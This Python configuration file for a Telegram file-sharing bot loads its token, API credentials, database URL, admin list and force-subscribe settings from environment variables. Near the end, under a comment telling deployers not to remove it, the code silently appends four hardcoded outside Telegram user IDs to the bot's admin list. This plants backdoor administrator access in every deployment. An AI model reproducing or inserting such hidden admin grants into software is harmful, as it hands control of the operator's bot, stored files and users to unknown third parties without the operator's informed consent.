# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

# Load environment variables
load_dotenv("config.env")

# Logging setup first
LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)

# Initialize logger
logger = LOGGER(__name__)

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "").strip()
if not TG_BOT_TOKEN:
    logger.error("❌ TG_BOT_TOKEN is required!")
    raise ValueError("TG_BOT_TOKEN is required")

# API ID Anda dari my.telegram.org
try:
    APP_ID = int(os.environ.get("APP_ID", "6"))
except ValueError:
    logger.error("❌ APP_ID must be a number!")
    raise ValueError("APP_ID must be a valid number")

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "").strip()
if not API_HASH:
    logger.error("❌ API_HASH is required!")
    raise ValueError("API_HASH is required")

# ID Channel Database
try:
    CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "0"))
    if CHANNEL_ID == 0:
        raise ValueError("CHANNEL_ID cannot be 0")
except ValueError as e:
    logger.error(f"❌ CHANNEL_ID error: {e}")
    raise ValueError("CHANNEL_ID must be a valid channel ID")

# NAMA OWNER
OWNER = os.environ.get("OWNER", "").strip()
if not OWNER:
    logger.error("❌ OWNER is required!")
    raise ValueError("OWNER is required")

# Protect Content
try:
    PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "True"))
except ValueError:
    PROTECT_CONTENT = True

# Heroku Credentials for updater
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME")
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY")

# Custom Repo for updater
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database with better error handling
DB_URI = os.environ.get("DATABASE_URL", "").strip()
if not DB_URI:
    logger.error("❌ DATABASE_URL is required!")
    raise ValueError("DATABASE_URL is required")

# Convert postgres:// to postgresql:// if needed
if DB_URI.startswith("postgres://"):
    DB_URI = DB_URI.replace("postgres://", "postgresql://", 1)
    logger.info("✅ Database URL format corrected")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
try:
    FORCE_SUB_CHANNEL1 = int(os.environ.get("FORCE_SUB_CHANNEL1", "0"))
    FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "0"))
    FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
except ValueError as e:
    logger.error(f"❌ Force sub configuration error: {e}")
    FORCE_SUB_CHANNEL1 = 0
    FORCE_SUB_CHANNEL2 = 0 
    FORCE_SUB_GROUP = 0

try:
    TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
except ValueError:
    TG_BOT_WORKERS = 4

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>",
)

# Parse ADMINS dengan error handling yang lebih baik
ADMINS = []
try:
    admin_ids = os.environ.get("ADMINS", "").strip()
    if admin_ids:
        for admin_id in admin_ids.split():
            try:
                admin_int = int(admin_id)
                ADMINS.append(admin_int)
                logger.info(f"✅ Admin added: {admin_int}")
            except ValueError:
                logger.warning(f"⚠️ Invalid admin ID '{admin_id}' ignored")
    
    if not ADMINS:
        logger.error("❌ No valid admin IDs found!")
        raise ValueError("At least one valid admin ID is required")
        
except Exception as e:
    logger.error(f"❌ Error parsing ADMINS: {e}")
    raise Exception(f"Error parsing ADMINS: {e}")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>Anda harus bergabung di Channel/Grup saya terlebih dahulu untuk melihat file yang saya bagikan</b>\n\n<b>Silakan Join ke Channel & Group terlebih dahulu</b>",
)

# Atur Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION")

# Setel True jika ingin menonaktifkan tombol share
try:
    DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
except ValueError:
    DISABLE_CHANNEL_BUTTON = False

# Max file size for copy (in bytes) - default 50MB
try:
    MAX_FILE_SIZE = int(os.environ.get("MAX_FILE_SIZE", "52428800"))
except ValueError:
    MAX_FILE_SIZE = 52428800

# Delay between messages to prevent flood
try:
    MESSAGE_DELAY = float(os.environ.get("MESSAGE_DELAY", "0.5"))
except ValueError:
    MESSAGE_DELAY = 0.5

# Developer IDs (jangan dihapus)
ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))

# Log configuration summary
logger.info("🔧 Configuration loaded:")
logger.info(f"├── Bot Token: {'✅ Set' if TG_BOT_TOKEN else '❌ Not set'}")
logger.info(f"├── API Hash: {'✅ Set' if API_HASH else '❌ Not set'}")
logger.info(f"├── Channel ID: {CHANNEL_ID}")
logger.info(f"├── Admins Count: {len(ADMINS)}")
logger.info(f"├── Force Sub CH1: {FORCE_SUB_CHANNEL1 if FORCE_SUB_CHANNEL1 else 'Disabled'}")
logger.info(f"├── Force Sub CH2: {FORCE_SUB_CHANNEL2 if FORCE_SUB_CHANNEL2 else 'Disabled'}")
logger.info(f"├── Force Sub Group: {FORCE_SUB_GROUP if FORCE_SUB_GROUP else 'Disabled'}")
logger.info(f"├── Database: {'✅ Connected' if DB_URI else '❌ Not configured'}")
logger.info(f"└── Max File Size: {MAX_FILE_SIZE / 1024 / 1024:.1f} MB")
